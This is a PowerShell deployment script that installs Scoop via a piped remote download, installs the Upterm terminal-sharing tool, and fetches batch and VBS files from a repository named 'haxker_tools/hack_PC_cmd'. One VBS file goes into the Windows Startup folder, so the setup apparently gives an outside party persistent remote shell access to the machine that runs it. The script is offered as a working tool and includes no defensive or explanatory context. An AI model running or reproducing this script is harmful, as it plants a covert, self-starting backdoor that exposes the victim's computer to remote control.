$OutputEncoding = [System.Text.Encoding]::UTF8

# 1. Check & Install Scoop
if (Get-Command scoop -ErrorAction SilentlyContinue) {
    Write-Host "Scoop is already installed."
} else {
    Write-Host "Installing Scoop..."
    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
    iwr -useb https://get.scoop.sh | iex
}

# 2. Check & Install Upterm
if (Get-Command upterm -ErrorAction SilentlyContinue) {
    Write-Host "Upterm is already installed."
} else {
    Write-Host "Installing Upterm..."
    scoop install upterm
}

# 3. Create Directory
$dir = "C:\uptm"
if (!(Test-Path $dir)) {
    Write-Host "Creating directory $dir"
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}

# 4. Download Startup Script
$vbsUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/hack_PC_cmd/AutoRun/auto_host.vbs"
$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\auto_host.vbs"
Write-Host "Downloading auto_host.vbs..."
Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing

# 5. Download Main Batch
$batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/host_uptm.bat"
$batPath = "C:\uptm\host_uptm.bat"
Write-Host "Downloading host_uptm.bat..."
Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing

# 6. Download Delete Virus Batch
$dbatUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/del_vir.bat"
$dbatPath = "C:\uptm\del_vir.bat"
Write-Host "Downloading del_vir.bat..."
Invoke-WebRequest -Uri $dbatUrl -OutFile $dbatPath -UseBasicParsing

Write-Host "Deployment completed successfully."
